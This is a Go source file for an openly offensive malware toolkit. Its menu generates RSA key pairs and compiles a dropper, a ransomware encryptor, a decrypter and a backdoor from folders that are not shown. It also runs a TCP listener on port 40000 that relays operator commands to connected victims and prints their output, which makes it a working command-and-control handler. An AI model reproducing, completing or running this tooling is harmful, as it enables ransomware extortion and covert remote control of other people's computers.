package main

import (
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
)

func keygenerate() {

	keySize := 2048
	privateKey, err := rsa.GenerateKey(rand.Reader, keySize)
	if err != nil {
		fmt.Println("Error while creating private key:", err)
		return
	}
	privateKeyFile, err := os.Create("private_key.pem")
	if err != nil {
		fmt.Println("Error while creating private key:", err)
		return
	}
	defer privateKeyFile.Close()

	privateKeyPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(privateKey),
	})

	privateKeyFile.Write(privateKeyPEM)
	fmt.Println("Private key created and saved to private_key.pem file.")

	publicKey := &privateKey.PublicKey
	publicKeyPEM, err := x509.MarshalPKIXPublicKey(publicKey)
	if err != nil {
		fmt.Println("Public key marshal error:", err)
		return
	}

	publicKeyFile, err := os.Create("public_key.pem")
	if err != nil {
		fmt.Println("Error while creating public key:", err)
		return
	}
	defer publicKeyFile.Close()

	pem.Encode(publicKeyFile, &pem.Block{
		Type:  "PUBLIC KEY",
		Bytes: publicKeyPEM,
	})

	fmt.Println("Public key created and saved to  public_key.pem file.")
}

func ransomware() {
	option := 0
	fmt.Println("1-)Create public-private key")
	fmt.Println("2-)Create Dropper")
	fmt.Println("3-)Create Ransomware")
	fmt.Println("4-)Create Ransomware Decrypter")
	fmt.Println("5-)Create Backdoor")
	fmt.Println("6-)Run HTTP Server")
	fmt.Print("Select your option :")
	fmt.Scan(&option)
	switch option {
	case 1:
		keygenerate()
	case 2:
		dropper()
	case 3:
		encrypt()
	case 4:
		decrypt()
	case 5:
		createBackdoor()
	case 6:
		server()
	}
}

func dropper() {
	cmd := exec.Command("go", "build", ".\\dropper\\dropper.go")

	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Hata:", err)
		fmt.Println("Çıktı:", string(output))
		return
	}
	fmt.Println("Derleme başarıyla tamamlandı.")

}
func encrypt() {
	option := 0
	fmt.Println("\033[1;31mBefore run the command, please create public key and copy to encrypt folder!!\033[0m")
	fmt.Println("1-)Create Ransomware")
	fmt.Println("2-)Exit")
	fmt.Print("Select your option :")
	fmt.Scan(&option)
	switch option {
	case 1:
		createRansom()
	}
}
func createRansom() {
	cmd := exec.Command("go", "build", ".\\encrypt\\encrypt.go")

	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Hata:", err)
		fmt.Println("Çıktı:", string(output))
		return
	}

	fmt.Println("Derleme başarıyla tamamlandı.")
	fmt.Println("Çıktı:", string(output))
}

func decrypt() {
	option := 0
	fmt.Println("\033[1;31mBefore run the command, please create private key and copy to decryt folder!!\033[0m")
	fmt.Println("1-)Create Decrypter")
	fmt.Println("2-)Exit")
	fmt.Print("Select your option :")
	fmt.Scan(&option)
	switch option {
	case 1:
		createDecrypt()
	}
}

func createDecrypt() {
	cmd := exec.Command("go", "build", ".\\decrypt\\decrypt.go")

	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Hata:", err)
		fmt.Println("Çıktı:", string(output))
		return
	}

	fmt.Println("Derleme başarıyla tamamlandı.")
	fmt.Println("Çıktı:", string(output))
}

func createBackdoor() {
	cmd := exec.Command("go", "build", ".\\Backdoor\\backdoor.go")

	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Hata:", err)
		fmt.Println("Çıktı:", string(output))
		return
	}

	fmt.Println("Derleme başarıyla tamamlandı.")
	fmt.Println("Çıktı:", string(output))
}
func server() {

	ln, err := net.Listen("tcp", ":40000") 
	if err != nil {
		log.Fatal("Dinleyici başlatılamadı:", err)
	}
	defer ln.Close()

	fmt.Println("Dinleyici başlatıldı, 40000 portunda bekleniyor...")

	for {
	
		conn, err := ln.Accept()
		if err != nil {
			log.Println("Bağlantı kabul edilemedi:", err)
			continue
		}
		go handleConnection(conn)
	}
}
func handleConnection(conn net.Conn) {
	defer conn.Close()
	fmt.Println("Bağlantı kabul edildi:", conn.RemoteAddr())
	reader := bufio.NewReader(os.Stdin)
	for {
		cmd, _ := reader.ReadString('\n')
		_, err := conn.Write([]byte(cmd))
		if err != nil {
			fmt.Println("Komut gönderilemedi:", err)
			return
		}

		reply := make([]byte, 1024)
		n, err := conn.Read(reply)
		if err != nil {
			fmt.Println("Cevap okunamadı:", err)
			return
		}
		fmt.Print(string(reply[:n]))
	}

}
